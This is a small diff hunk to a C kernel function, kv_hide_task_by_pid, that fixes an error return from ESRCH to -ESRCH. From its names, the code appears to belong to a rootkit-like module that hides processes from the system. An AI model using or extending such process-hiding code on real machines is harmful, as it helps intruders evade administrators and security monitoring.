@@ -354,7 +354,7 @@ int kv_hide_task_by_pid(pid_t pid, __be32 saddr, bool children)
 		_select_children(task);
 		_fetch_children_and_hide_tasks(task, saddr);
 	} else {
-		rc = ESRCH;
+		rc = -ESRCH;
 	}
 
 	return rc;
